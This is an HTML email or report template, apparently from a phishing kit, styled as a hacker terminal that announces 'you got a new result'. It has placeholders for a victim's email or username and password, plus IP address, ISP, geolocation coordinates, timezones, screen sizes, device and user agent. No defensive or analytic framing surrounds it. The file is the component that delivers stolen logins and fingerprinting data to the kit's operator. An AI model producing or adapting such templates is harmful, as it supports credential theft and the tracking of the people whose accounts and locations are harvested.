<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Onske - App(s)</title>
<style>
body, html {
    margin: 0;
    padding: 0;
    height: 100%; /* Full height of the viewport */
    background-image: linear-gradient(to right, #0f2027, #203a43, #2c5364);
    background-color: #000;
    color: #ffffff;
    font-family: Consolas, monospace;
}

.terminal {
    max-width: 600px;
    margin: 20px auto;
    border: 2px solid #333;
    border-radius: 5px;
    background-color: #1e1e1e;
	color: #ffffff;
}

.terminal-header {
    background-color: #333;
    padding: 5px;
    display: flex;
}
.prompt {
	color: #00ff00;
}
.terminal-button {
    height: 12px;
    width: 12px;
    border-radius: 50%;
    margin-right: 5px;
}

.close { background-color: #ff5f56; }
.minimize { background-color: #ffbd2e; }
.maximize { background-color: #27c93f; }

.terminal-body {
    padding: 10px;
	font-family: Consolas, monospace;
}
.blink {
	animation: blinker 1s linear infinite;
}
@keyframes blinker {
	50% {
		opacity: 0;
	}
}
        
@media (max-width: 600px) {
    .terminal {
        margin: 0;
        max-width: 100%;
        border-radius: 0;
		color: #ffffff;
    }
}
</style>
</head>
<body style="height: 100%;margin: 0;background-color: #000;color: #ffffff;font-family: Consolas, monospace;">
    <div class="terminal" style="max-width: 600px;margin: 20px auto;border: 2px solid #333;border-radius: 5px;background-color: #1e1e1e;color: #ffffff;">
        <div class="terminal-header" style="background-color: #333;padding: 5px;display: flex;">
            <div class="terminal-button close" style="background-color: #ff5f56;height: 12px;width: 12px;border-radius: 50%;margin-right: 5px;"></div>
            <div class="terminal-button minimize" style="background-color: #ffbd2e;height: 12px;width: 12px;border-radius: 50%;margin-right: 5px;"></div>
            <div class="terminal-button maximize" style="background-color: #27c93f;height: 12px;width: 12px;border-radius: 50%;margin-right: 5px;"></div>
        </div>
        <div class="terminal-body" style="padding: 10px;font-family: Consolas, monospace;">
            <p>
				<span style="color: #00ff00;">C:\Users\Ønske&gt;</span> Congratulations! you got a new result<br/>
				<span style="color: #00ff00;">C:\Users\Ønske&gt;</span> show result
			</p>
			<p>
				
			</p>
            <!-- More terminal lines here -->
			<div class="responsive-table" style="">
			<table style="width:100%; color: #86ffff;">
				<thead>
					<tr>
						<th width="40%"><span style="color:#ffffff;"><b>Info</b>(s)</span></th>
						<th width="60%"><span style="color:#ffffff;"><b>Detail</b>(s)</span></th>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td width="40%"style="text-align:left;">--Email/User</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{email}{username}</td>
					</tr>
					<tr>
						<td width="40%"style="text-align:left;">--Password</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{password}</td>
					</tr>
					<tr>
						<td height="10" colspan="2" valign="middle" align="center">
							<hr style="border-bottom:3px solid #bcbcbc;">
						</td>
					 </tr>
					<tr>
						<td width="40%"style="text-align:left;">--IP Address</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{ip}</td>
					</tr>
					<tr>
						<td width="40%"style="text-align:left;">--Hostname</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{hostname}</td>
					</tr>
					<tr>
						<td width="40%"style="text-align:left;">--ISP</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{isp}</td>
					</tr>
					<tr>
						<td width="40%"style="text-align:left;">--Language</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{language}</td>
					</tr>
					<tr>
						<td width="40%"style="text-align:left;">--Device Timezone</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{timezoneD}</td>
					</tr>
					<tr>
						<td width="40%"style="text-align:left;">--IP Timezone</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{timezone}</td>
					</tr>
					<tr>
						<td width="40%"style="text-align:left;">--Device Resolution</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{deviceR}</td>
					</tr>
					<tr>
						<td width="40%" style="text-align:left;">--Browser Resolution</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{browserR}</td>
					</tr>
					<tr>
						<td width="40%"style="text-align:left;">--Latitude/Longitude</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{lat}/{lon}</td>
					</tr>
					<tr>
						<td width="40%"style="text-align:left;">--Device</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{detailsdevice}</td>
					</tr>
					<tr>
						<td width="40%"style="text-align:left;">--Useragent</td>
						<td width="60%" style="color:#ffffff;text-align:left;">{useragent}</td>
					</tr>
					<!-- More rows here -->
				</tbody>
			</table>
		</div>
		<p>
			<span style="color: #00ff00;">C:\Users\Ønske&gt;</span> By Ønske Created with ❤️ and lot of coffee<span style="" class="blink">_</span>
		</p>
        </div>
		
    </div>
</body>

</html>
